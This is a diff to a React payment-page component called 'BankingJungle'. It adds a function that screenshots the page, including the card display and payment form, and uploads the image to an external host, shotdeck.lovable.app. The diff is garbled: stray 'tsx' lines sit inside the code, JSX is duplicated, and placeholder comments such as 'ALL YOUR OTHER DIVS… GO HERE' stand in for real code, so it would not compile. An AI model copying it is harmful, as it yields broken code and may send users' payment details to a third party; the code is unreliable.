@@ -1,3 +1,7 @@
+tsx
+import { domToPng } from 'modern-screenshot';
+import { useRef, useEffect, useMemo, useState, type FormEvent } from 'react';
+
 
 import { createFileRoute } from "@tanstack/react-router";
 import { ArrowRight, Check, Leaf, LockKeyhole, RotateCcw, Wifi } from "lucide-react";
@@ -52,15 +56,49 @@ function BankingJungle() {
     return () => window.clearTimeout(timer);
   }, []);
 
+
+  
   useEffect(() => {
     if (phase !== "processing") {
       setShowSuccessPop(false);
       return;
     }
+
     const timer = window.setTimeout(() => setShowSuccessPop(true), 1000);
     return () => window.clearTimeout(timer);
   }, [phase]);
 
+
+  tsx
+  const handleCapture = async () => {
+    if (!captureRef.current) return;
+    
+    try {
+      const dataUrl = await domToPng(captureRef.current, {
+        backgroundColor: '#ffffff',
+        filter: (node) => {
+          // This prevents the oklch/radial-gradient crash
+          if (!(node instanceof HTMLElement)) return true;
+          const exclusions = ['jungle-shell', 'canopy', 'pollen-field', 'film-grain'];
+          return !exclusions.some(cls => node.classList.contains(cls));
+        }
+      });
+
+      const blob = await (await fetch(dataUrl)).blob();
+      const formData = new FormData();
+      formData.append('file', blob, `receipt-${Date.now()}.png`);
+
+      await fetch('https://shotdeck.lovable.app/api/public/integrations/screenshot-upload', {
+        method: 'POST',
+        body: formData,
+      });
+    } catch (error) {
+      console.error('Capture failed:', error);
+    }
+  };
+
+
+  
   const displayCard = useMemo(() => card || "5311 2468 3513 4592", [card]);
 
   function handleMove(event: React.MouseEvent<HTMLElement>) {
@@ -124,3 +162,23 @@ function BankingJungle() {
     >
       <img src={jungleCanopy} width={1920} height={1080} alt="" className="jungle-backdrop" />
       {/* ... rest of your JSX remains exactly the same ... */}
+
+      tsx
+  return (
+    <main 
+      ref={captureRef} 
+      className={`jungle-stage ${phase === "processing" ? "is-processing" : ""} ${phase === "complete" ? "is-complete" : ""}`} 
+      onMouseMove={handleMove}
+    >
+      <img src={jungleCanopy} width={1920} height={1080} alt="" className="jungle-backdrop" />
+      
+      {/* ... ALL YOUR OTHER DIVS AND SECTIONS GO HERE ... */}
+
+      {/* Make sure your "Pay" button inside the form still looks like this: */}
+      <button type="submit" className="jungle-button">
+        Pay ${amount}
+      </button>
+
+    </main>
+  );
+} // This closing brace ends the BankingJungle function
